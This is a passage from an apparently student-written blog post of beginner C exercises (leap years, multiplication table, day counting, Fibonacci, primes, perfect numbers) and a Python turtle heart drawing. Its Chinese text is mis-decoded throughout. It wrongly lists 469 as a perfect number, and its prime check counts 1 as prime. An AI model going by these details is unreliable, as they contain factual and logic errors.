<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeapYear_PeaceYear</span><span class="params">(<span class="keyword">int</span> year)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>)||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;é—°å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(year=<span class="number">2001</span>;year&lt;=<span class="number">2100</span>;year++)</span><br><span class="line">		<span class="keyword">if</span>(LeapYear_PeaceYear(year)==<span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,year);</span><br><span class="line">				j++;</span><br><span class="line">				<span class="keyword">if</span>(j%<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nå¹³å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(year=<span class="number">2001</span>;year&lt;=<span class="number">2100</span>;year++)</span><br><span class="line">		<span class="keyword">if</span>(LeapYear_PeaceYear(year)==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,year);</span><br><span class="line">				j++;</span><br><span class="line">				<span class="keyword">if</span>(j%<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/211.jpg"></p>
<h2 id="ä¹ä¹ä¹˜æ³•è¡¨"><a href="#ä¹ä¹ä¹˜æ³•è¡¨" class="headerlink" title="ä¹ä¹ä¹˜æ³•è¡¨"></a>ä¹ä¹ä¹˜æ³•è¡¨</h2><p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%2d*%2d=%2d&quot;</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/99.jpg"></p>
<h2 id="å€’ç€è¾“å‡º"><a href="#å€’ç€è¾“å‡º" class="headerlink" title="å€’ç€è¾“å‡º"></a>å€’ç€è¾“å‡º</h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼š123 è¾“å‡ºï¼š321  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,a,r=<span class="number">0</span>,t=<span class="number">10</span>,e;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	e=x;</span><br><span class="line">	<span class="keyword">while</span>(x)</span><br><span class="line">		&#123;</span><br><span class="line">			a=x%<span class="number">10</span>;</span><br><span class="line">			r=r*t+a;</span><br><span class="line">			x/=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d---%d\n&quot;</span>,e,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/321.jpg"></p>
<h2 id="ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ"><a href="#ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ" class="headerlink" title="ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ"></a>ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ</h2><p>é—®é¢˜ï¼šæ±‚ä½ å­˜åœ¨äºè¿™ä¸ªç¾ä¸½ä¸–ç•Œçš„å¤©æ•°ï¼  </p>
<p>å¦‚æœ‰è¯¯ è¯·æŒ‡å‡ºã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">days_of_year</span><span class="params">(<span class="keyword">int</span> year)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">between_year_brgin_and_year_end</span><span class="params">(<span class="keyword">int</span> year_begin,<span class="keyword">int</span> year_end)</span> </span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">days</span><span class="params">(<span class="keyword">int</span> year,<span class="keyword">int</span> month,<span class="keyword">int</span> day)</span></span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> year_begin,month_begin,day_begin,sum_begin=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> year_end,month_end,day_end,sum_end=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum_middle=<span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥èµ·å§‹æ—¥æœŸï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year_begin,&amp;month_begin,&amp;day_begin);</span><br><span class="line">	sum_begin=days(year_begin,month_begin,day_begin);<span class="comment">//ä¾‹å¦‚ï¼š2017 8 20 æ±‚1--7æœˆåˆ†çš„å¤©æ•° </span></span><br><span class="line">	sum_begin+=day_begin;<span class="comment">//æ±‚ 1--7ä»½çš„å¤©æ•° + 8æœˆ çš„å¤©æ•°ï¼ˆ20ï¼‰ == 232 å¤© </span></span><br><span class="line">	<span class="comment">//printf(&quot;%d/%d/%d æ˜¯%då¹´çš„ç¬¬%då¤©\n&quot;,year_begin,month_begin,day_begin,year_begin,sum_begin);</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æˆªæ­¢æ—¥æœŸï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year_end,&amp;month_end,&amp;day_end);</span><br><span class="line">	sum_end=days(year_end,month_end,day_end);<span class="comment">//ä¾‹å¦‚ï¼š2019 8 20 æ±‚1--7æœˆåˆ†çš„å¤©æ•° </span></span><br><span class="line">	sum_end+=day_end;<span class="comment">//æ±‚ 1--7ä»½çš„å¤©æ•° + 8æœˆ çš„å¤©æ•°ï¼ˆ20ï¼‰ == 232 å¤© </span></span><br><span class="line">	<span class="comment">//printf(&quot;%d/%d/%d æ˜¯%då¹´çš„ç¬¬%då¤©\n&quot;,year_end,month_end,day_end,year_end,sum_end);</span></span><br><span class="line">	sum_middle+=between_year_brgin_and_year_end(year_begin,year_end);<span class="comment">//æ±‚èµ·å§‹å¹´ä»½ä¸ç»“æŸå¹´ä»½ ä¸­é—´å¹´ä»½çš„å¤©æ•°  </span></span><br><span class="line">	<span class="comment">//printf(&quot;ä¸­é—´å¹´ä»½çš„å¤©æ•°ï¼š%d\n&quot;,sum_middle);						 //ä¾‹å¦‚ï¼š 2017--2019 å³ æ±‚ä¸­é—´å¹´ä»½ 2018 çš„å¤©æ•°</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(year_begin!=year_end)</span><br><span class="line">		sum_begin=days_of_year(year_begin)-sum_begin;<span class="comment">//æ±‚2017 8 20 ä¹‹å åˆ°2017å¹´çš„æœ€åä¸€å¤©çš„ å¤©æ•°</span></span><br><span class="line">												<span class="comment">// ä¾‹å¦‚ 2017 8 20 æ˜¯2017å¹´çš„ ç¬¬232å¤© </span></span><br><span class="line">												<span class="comment">// 2017å¹´å‰©ä½™çš„å¤©æ•°  365-232=  133å¤© </span></span><br><span class="line">												</span><br><span class="line">																</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d--&quot;</span>,year_begin,month_begin,day_begin);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d&quot;</span>,  year_end,month_end,day_end);</span><br><span class="line">	<span class="keyword">if</span>(year_begin==year_end)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ç›¸éš”: %då¤©\n&quot;</span>,sum_end-sum_begin);<span class="comment">//å¦‚æœæ˜¯åŒä¸€å¹´çš„æƒ…å†µä¸‹ï¼šä¾‹å¦‚ï¼š2019/1/1---2019/2/1 ==32-1=31 </span></span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ç›¸éš”ï¼š%då¤©\n&quot;</span>,sum_begin+sum_middle+sum_end);<span class="comment">//2017/8/20 --- 2019/8/20 </span></span><br><span class="line">														<span class="comment">//   sum_begin        + sum_middle    + sum_end</span></span><br><span class="line">														<span class="comment">//     133           +  365          +   232</span></span><br><span class="line">														<span class="comment">//2017å¹´å‰©ä½™çš„å¤©æ•° + 2018çš„å¤©æ•° + 8/20æ˜¯2019çš„ç¬¬ xxxå¤© </span></span><br><span class="line">	<span class="keyword">if</span>(sum_begin+sum_middle+sum_end&gt;=<span class="number">365</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;â‰ˆ%då¹´\n&quot;</span>,(sum_begin+sum_middle+sum_end)/<span class="number">365</span>);<span class="comment">//å¦‚æœå¤©æ•°å¤ªå¤§ è½¬æ¢ä¸ºå¤§æ¦‚å¹´ä»½ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">days_of_year</span><span class="params">(<span class="keyword">int</span> year)</span><span class="comment">//æ±‚ é—°å¹´å¹³å¹´çš„å¤©æ•° </span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">366</span>;</span><br><span class="line">		<span class="keyword">else</span>	</span><br><span class="line">			<span class="keyword">return</span> <span class="number">365</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">between_year_brgin_and_year_end</span><span class="params">(<span class="keyword">int</span> year_begin,<span class="keyword">int</span> year_end)</span><span class="comment">//æ±‚èµ·å§‹å¹´ä»½ä¸ç»“æŸå¹´ä»½ ä¸­é—´å¹´ä»½çš„å¤©æ•°  </span></span></span><br><span class="line"><span class="function">	</span>&#123;															<span class="comment">//ä¾‹å¦‚ï¼š 2017--2019 å³ æ±‚ä¸­é—´å¹´ä»½ 2018çš„å¤©æ•° </span></span><br><span class="line">		<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(year_begin!=year_end)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(year_begin+=<span class="number">1</span>;year_begin&lt;year_end;year_begin++)</span><br><span class="line">				sum+=days_of_year(year_begin);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">days</span><span class="params">(<span class="keyword">int</span> year,<span class="keyword">int</span> month,<span class="keyword">int</span> day)</span><span class="comment">//æ±‚æŸå¹´æŸæœˆ æ˜¯æŸå¹´çš„å¤šå°‘å¤©  </span></span></span><br><span class="line"><span class="function">	</span>&#123;								<span class="comment">//ä¾‹å¦‚ï¼š 2019 8 20 å‰ 8-1ä¸ªæœˆçš„å¤©æ•° </span></span><br><span class="line">		<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">switch</span>(month<span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">12</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">11</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">10</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">9</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">8</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">7</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">6</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">5</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">4</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">3</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">2</span>:<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>) </span><br><span class="line">							sum+=<span class="number">29</span>;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							sum+=<span class="number">28</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">1</span>:sum+=<span class="number">31</span>;</span><br><span class="line">			&#125;		</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/days.jpg"></p>
<p><img src="/2019/08/12/OLD/day.jpg"></p>
<h2 id="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"><a href="#æ–æ³¢æ‹‰å¥‘æ•°åˆ—" class="headerlink" title="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"></a>æ–æ³¢æ‹‰å¥‘æ•°åˆ—</h2><h2 id="fibonacci-sequence"><a href="#fibonacci-sequence" class="headerlink" title="fibonacci sequence"></a>fibonacci sequence</h2><p>åˆ©ç”¨æ•°ç»„æ±‚å‡ºæ–æ³¢æ‹‰å¥‘æ•°åˆ—å‰20é¡¹:  </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i;</span><br><span class="line">	a[<span class="number">0</span>]=a[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ–æ³¢æ‹‰å¥‘æ•°åˆ—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]+a[i<span class="number">-2</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/2.png"></p>
<h2 id="è´¨æ•°"><a href="#è´¨æ•°" class="headerlink" title="è´¨æ•°"></a>è´¨æ•°</h2><p>é™¤äº†1å’Œå®ƒæœ¬èº«ä»¥å¤–ä¸å†æœ‰å…¶ä»–å› æ•°çš„è‡ªç„¶æ•°ã€‚  </p>
<p>æˆ‘è®¤ä¸ºé™¤äº†1å’Œå®ƒæœ¬èº«ä¹‹å¤– å¤ªå­¤ç‹¬äº†!</p>
<p>so  lonely_number()  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lonely_number</span><span class="params">(<span class="keyword">int</span> number)</span><span class="comment">//é™¤äº†1å’Œå®ƒæœ¬èº«ä»¥å¤–ä¸å†æœ‰å…¶ä»–å› æ•°çš„è‡ªç„¶æ•°ã€‚</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;number/<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1000ä»¥å†…çš„è´¨æ•°ï¼ˆç´ æ•°ï¼‰ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(lonely_number(i))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%3d &quot;</span>,i);</span><br><span class="line">					j++;</span><br><span class="line">					<span class="keyword">if</span>(j%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/lonely-number.jpg"></p>
<h2 id="max-min-sum-ave"><a href="#max-min-sum-ave" class="headerlink" title="max min sum ave"></a>max min sum ave</h2><p>è¾“å…¥Nä¸ªæ•°å­—æ±‚å‡º<br>æœ€å¤§å€¼å’Œæœ€å°å€¼<br>å’Œ<br>å¹³å‡å€¼ </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5  <span class="comment">//è‡ªå®šä¹‰å‡ ä¸ª</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,sum=<span class="number">0</span>,ave,max,min;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•´æ•°ï¼š&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);  		<span class="comment">//è¾“å…¥Nä¸ªæ•°å­—</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">	  	sum+=a[i];          		<span class="comment">//æ±‚å’Œ</span></span><br><span class="line">	max=min=a[<span class="number">0</span>];           		<span class="comment">//å‡å®šç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæœ€å¤§å€¼ï¼Œæœ€å°å€¼</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[i]&gt;max)</span><br><span class="line">				max=a[i];   		<span class="comment">//æ±‚æœ€å¤§</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;min)</span><br><span class="line">					min=a[i]; 		<span class="comment">//æ±‚æœ€å°</span></span><br><span class="line">		&#125;</span><br><span class="line">    ave=sum/N;              		<span class="comment">//æ±‚å¹³å‡å€¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max=%d\nmin=%d\nsum=%d\nave=%d\n&quot;</span>,max,min,sum,ave);<span class="comment">//è¾“å‡º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š<br>è¯·è¾“å…¥5ä¸ªæ•´æ•°ï¼š1 2 3 4 5<br>max=5<br>min=1<br>sum=15<br>ave=3</p>
<p><img src="/2019/08/12/OLD/maxmin.jpg"></p>
<h2 id="ä½¿ç”¨pythonç”»â¤"><a href="#ä½¿ç”¨pythonç”»â¤" class="headerlink" title="ä½¿ç”¨pythonç”»â¤"></a>ä½¿ç”¨pythonç”»â¤</h2><p>åˆ©ç”¨pythonç”»ä¸€ä¸ªâ¤  </p>
<p>å¯¼å…¥ turtle åº“ å¹¶èµ·ä¸€ä¸ªåˆ«åä¸ºï¼š t  </p>
<p>è¿™æ ·ä¾¿äºæ“ä½œï¼š  </p>
<p>æœ‰ç‚¹ç²—ç³™ï¼</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="comment">#ç”»äºº</span></span><br><span class="line">t.color(<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">t.pensize(<span class="number">2</span>)</span><br><span class="line">t.circle(<span class="number">40</span>)</span><br><span class="line">t.right(<span class="number">90</span>)</span><br><span class="line">t.forward(<span class="number">110</span>)</span><br><span class="line">t.right(<span class="number">45</span>)</span><br><span class="line">t.forward(<span class="number">60</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.backward(<span class="number">60</span>)</span><br><span class="line">t.left(<span class="number">43</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">45</span>,-<span class="number">111</span>)</span><br><span class="line">t.goto(<span class="number">45</span>,-<span class="number">180</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,-<span class="number">45</span>)</span><br><span class="line">t.left(<span class="number">90</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">70</span>,-<span class="number">45</span>)</span><br><span class="line">t.goto(<span class="number">89</span>,-<span class="number">30</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,-<span class="number">55</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">72</span>,-<span class="number">55</span>)</span><br><span class="line">t.right(<span class="number">34</span>)</span><br><span class="line">t.forward(<span class="number">22</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.left(<span class="number">34</span>)</span><br><span class="line">t.goto(<span class="number">199</span>,-<span class="number">50</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"></span><br><span class="line">t.pensize(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.delay(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#ç”»â¤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        t.right(<span class="number">1</span>)</span><br><span class="line">        t.forward(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.color(<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;pink&#x27;</span>)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.left(<span class="number">140</span>)</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">h()</span><br><span class="line">t.left(<span class="number">120</span>)</span><br><span class="line">h()</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line"></span><br><span class="line">t.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/3.gif"></p>
<h2 id="å®Œå…¨æ•°-1000ä»¥å†…-ï¼ˆPerfect-numberï¼‰"><a href="#å®Œå…¨æ•°-1000ä»¥å†…-ï¼ˆPerfect-numberï¼‰" class="headerlink" title="å®Œå…¨æ•°(1000ä»¥å†…)ï¼ˆPerfect numberï¼‰"></a>å®Œå…¨æ•°(1000ä»¥å†…)ï¼ˆPerfect numberï¼‰</h2><p>è¾“å‡º1000ä»¥å†…çš„å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰  </p>
<p>å¦‚æœä¸€ä¸ªæ•°æ°å¥½ç­‰äºå®ƒçš„å› å­ä¹‹å’Œï¼Œåˆ™ç§°è¯¥æ•°ä¸ºâ€œå®Œå…¨æ•°â€  </p>
<p>å¦‚ï¼š 6 ï¼Œ28, 469 â€¦â€¦  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">perfect_number</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="keyword">int</span> s,j;</span><br><span class="line">		s=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=number/<span class="number">2</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(number%j==<span class="number">0</span>)</span><br><span class="line">				s+=j;</span><br><span class="line">		<span class="keyword">if</span>(number==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1000ä»¥å†…çš„å®Œæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(number=<span class="number">1</span>;number&lt;=<span class="number">1000</span>;number++)</span><br><span class="line">		<span 